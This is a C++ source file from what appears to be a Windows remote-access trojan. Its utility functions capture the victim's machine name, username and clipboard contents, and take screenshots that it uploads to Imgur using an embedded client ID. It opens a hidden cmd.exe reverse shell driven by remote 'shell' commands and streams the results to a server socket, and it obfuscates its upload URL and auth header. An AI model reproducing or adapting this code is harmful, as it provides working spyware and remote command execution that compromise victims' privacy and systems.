#include "Utils.h"
#include "base64.h"

#include <regex>

int eraseSubStr(std::string& mainStr, const std::string& toErase) {
    // Search for the substring in string
    size_t pos = mainStr.find(toErase);
    if (pos != std::string::npos)
    {
        // If found then erase it from string
        mainStr.erase(pos, toErase.length());
        return 0;
    }
    return 1;
}

bool hasEnding(std::string const& fullString, std::string const& ending) {
    if (fullString.length() >= ending.length()) {
        return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
    }
    else {
        return false;
    }
}

std::string getConsoleOut(HANDLE hFileSource) {

    std::string outputString;
    DWORD dwBytesRead = 0;
    char buffer[512];
    unsigned long bread;
    unsigned long avail;

    Sleep(1000); // this shit could may be set manually so each command has enough time to execute and return something

    while (true) {
        PeekNamedPipe(hFileSource, buffer, 512-1, &bread, &avail, NULL);
        //check to see if there is any data to read from stdout
        if (bread != 0)
        {
            if (ReadFile(hFileSource, buffer, 512 - 1, &dwBytesRead, NULL))
            {
                if (dwBytesRead == 0)
                    break;
                buffer[dwBytesRead] = '\0';
                outputString += buffer;
                std::cout << buffer << std::endl;
                memset(buffer, 0, sizeof(buffer));
            }
        }
        else {
            break;
        }
    }

    return outputString;
}

std::string Utils::getMachineName() {
    char machineBuffer[1024];
    DWORD nameLen = 1024;
    GetComputerName(machineBuffer, &nameLen);
    return std::string(machineBuffer);
}

std::string Utils::getUsername()
{
    char nameBuffer[1024];
    DWORD nameLen = 1024;
    GetUserName(nameBuffer, &nameLen);
    return std::string(nameBuffer);
}

std::string Utils::getClipboardText() {
    // Try opening the clipboard
    if (!OpenClipboard(nullptr)) {
        return std::string("Error opening clipboard");
    }


    // Get handle of clipboard object for ANSI text
    HANDLE hData = GetClipboardData(CF_TEXT);
    if (hData == nullptr) {
        return std::string("Couldnt get clipboard handle");
    }

    // Lock the handle to get the actual text pointer
    char* pszText = static_cast<char*>(GlobalLock(hData));
    if (pszText == nullptr) {
        return std::string("Clipboard pointer is invalid");
    }

    // Save text in a string class instance
    std::string text(pszText);

    GlobalUnlock(hData);
    CloseClipboard();

    return text;
}

std::string Utils::getScreenshotBase64() {
    HDC hdcSource = GetDC(NULL);
    HDC hdcMemory = CreateCompatibleDC(hdcSource);

    SetProcessDPIAware(); // if somebody has scaling on 150% or so
    unsigned short capX = GetDeviceCaps(hdcSource, HORZRES);
    unsigned short capY = GetDeviceCaps(hdcSource, VERTRES);

    HBITMAP hBitmap = CreateCompatibleBitmap(hdcSource, capX, capY);
    HBITMAP hBitmapOld = (HBITMAP)SelectObject(hdcMemory, hBitmap);

    BitBlt(hdcMemory, 0, 0, capX, capY, hdcSource, 0, 0, SRCCOPY);
    hBitmap = (HBITMAP)SelectObject(hdcMemory, hBitmapOld);

    DeleteDC(hdcSource);
    DeleteDC(hdcMemory);

    // screenshot to jpg and save to stream
    std::vector<BYTE> buf;
    IStream* stream = NULL;
    HRESULT hr = CreateStreamOnHGlobal(0, TRUE, &stream);
    CImage image;
    ULARGE_INTEGER liSize;

    image.Attach(hBitmap);
    image.Save(stream, Gdiplus::ImageFormatJPEG);
    IStream_Size(stream, &liSize);
    DWORD len = liSize.LowPart;
    IStream_Reset(stream);
    buf.resize(len);
    IStream_Read(stream, &buf[0], len);
    stream->Release();

    std::string imageString(buf.begin(), buf.end());
    std::string base64String = base64_encode(imageString);

    buf.clear();
    DeleteObject(stream);
    DeleteObject(hBitmap);
    DeleteObject(image);

    return base64String;

}

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    ((std::string*)userp)->append((char*)contents, size * nmemb);
    return size * nmemb;
}

std::string Utils::uploadToImgur(std::string image) {
    CURL* curl;
    CURLcode response;
    curl = curl_easy_init();
    std::string readBuffer;
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
        curl_easy_setopt(curl, CURLOPT_URL, OBFUSCATE("https://api.imgur.com/3/image"));
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_DEFAULT_PROTOCOL, "https");
        struct curl_slist* headers = NULL;
        headers = curl_slist_append(headers, OBFUSCATE("Authorization: Client-ID 0fd6a8487064d62"));
        curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        curl_mime* mime;
        curl_mimepart* part;
        mime = curl_mime_init(curl);
        part = curl_mime_addpart(mime);
        curl_mime_name(part, "image");
        curl_mime_data(part, image.c_str(), CURL_ZERO_TERMINATED);
        curl_easy_setopt(curl, CURLOPT_MIMEPOST, mime);

        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &readBuffer);
        response = curl_easy_perform(curl);
        curl_mime_free(mime);

        delete mime;
        delete part;

        // regex
        std::regex regUrl(R"(https?:\\\/.*\.(?:png|jpg))");
        std::smatch match;
        std::regex_search(readBuffer, match, regUrl);

        readBuffer.clear();
        curl_easy_cleanup(curl);

        if (match.size() == 1) {
            std::string matchString = match[0].str();
            matchString.erase(remove(matchString.begin(), matchString.end(), '\\'), matchString.end());

            return matchString.c_str();
        }

        return std::string("No link generated");
    }

    return std::string("No link generated");
}

std::string Utils::executeCommand(std::string command) {
    int returnValue = eraseSubStr(command, "shell ");
    if (returnValue == 1) return std::string("Command in invalid format");
    command += "\n";

    if (hasEnding(command, "quit\n") || hasEnding(command, "exit\n")) {
        CloseHandle(Utils::hWriteIN);
        CloseHandle(Utils::hWriteOUT);
        CloseHandle(Utils::hReadIN);
        CloseHandle(Utils::hReadOUT);
        TerminateProcess(Utils::procInfo.hProcess, 0);
        Utils::consoleOpen = false;
        return std::string("Successfully exited terminal");
    }

    if (!Utils::consoleOpen) {
        // https://stackoverflow.com/questions/10119999/writing-to-a-process-stdin-via-windows-pipes
        
        SECURITY_ATTRIBUTES saPipe = { 0 };
        Utils::procInfo = { 0 };
        STARTUPINFO procSi;
        Utils::hWriteOUT, Utils::hReadOUT, Utils::hWriteIN, Utils::hReadIN = NULL;
        Utils::dwWritten, Utils::dwRead = NULL;

        saPipe.nLength = sizeof(SECURITY_ATTRIBUTES);
        saPipe.bInheritHandle = TRUE;
        saPipe.lpSecurityDescriptor = NULL;
        CreatePipe(&Utils::hReadOUT, &Utils::hWriteOUT, &saPipe, 0);
        SetHandleInformation(Utils::hReadOUT, HANDLE_FLAG_INHERIT, 0);
        CreatePipe(&Utils::hReadIN, &Utils::hWriteIN, &saPipe, 0);
        SetHandleInformation(Utils::hWriteIN, HANDLE_FLAG_INHERIT, 0);

        ZeroMemory(&procSi, sizeof(STARTUPINFO));
        procSi.cb = sizeof(STARTUPINFO);
        procSi.hStdError = Utils::hWriteOUT;
        procSi.hStdOutput = Utils::hWriteOUT;
        procSi.hStdInput = Utils::hReadIN;
        procSi.dwFlags |= STARTF_USESTDHANDLES;

        char cmdString[] = "cmd.exe";
        CreateProcess(NULL, cmdString, NULL, NULL, TRUE, 0, NULL, NULL, &procSi, &procInfo);
        WriteFile(Utils::hWriteIN, command.c_str(), command.length(), &dwWritten, NULL);

        Utils::consoleOpen = true;

        std::string output = getConsoleOut(Utils::hReadOUT);
        return output;
    }
    else {
        WriteFile(Utils::hWriteIN, command.c_str(), command.length(), &dwWritten, NULL);
        std::string output = getConsoleOut(Utils::hReadOUT);
        return output;
    }
    return std::string(OBFUSCATE("Error"));
}

void Utils::sendToServer(SOCKET socket, const char* buffer) {
    int maxChunkSize = 1024;
    int len = strlen(buffer);
    send(socket, (char*)&len, sizeof(int), 0);

    int i = 0;
    while (i < len) {
        const int l = send(socket, &buffer[i], __min(maxChunkSize, len - i), 0);
        if (l < 0) { return; }
        i += l;
    }
}